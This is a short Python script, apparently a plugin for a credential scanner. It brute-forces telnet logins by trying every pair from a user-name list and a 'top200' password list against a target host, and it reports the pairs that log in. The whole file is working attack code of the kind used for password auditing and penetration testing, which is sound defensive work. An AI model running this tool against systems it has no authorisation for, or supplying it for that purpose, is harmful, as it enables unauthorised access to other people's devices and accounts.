#!/usr/bin/python
# -*- coding: UTF-8 -*-
"""
@author:CHENYANG7
@file:TelnetCheck.py
@time:2020/10/10
"""

import telnetlib
import sys
import unittest
from .utils.getFile import get_var_items, genUserPasswd


def get_dict(flag=1):
    user_list = get_var_items('ssh_user.txt')
    passwd_list = get_var_items('top200passwd.txt')

    return genUserPasswd(user_list, passwd_list)


def bf(target, user, passwd, timeout):
    """
    telnet Crack
    """
    retVal = ''
    try:

        tn = telnetlib.Telnet(host=target[1], port=target[2], timeout=timeout)
        tn.read_until("login: ", timeout=timeout)
        tn.write(user + '\r\n')

        tn.read_until("assword: ", timeout=timeout)
        tn.write(passwd + '\r\n')

        try:
            tn.read_until('login:', timeout=timeout)
        except:
            infoMsg = "telnet login success! username:%s  password:%s" % (user, passwd)
            retVal = '{}/{}'.format(user, passwd)

        tn.close()

    except Exception as e:
        pass

    return retVal


def check(target, **kwargs):
    retVal = {'service': 'telnet', 'status': 1, 'url': ''}
    timeout = kwargs.get('timeout') or 3
    flag = kwargs.get('flag') or 1

    for user, passwd in get_dict(flag):
        res = bf(target, user, passwd, timeout)
        if res:
            retVal['status'] = 2
            retVal['url'] += res + '\n'

    return retVal
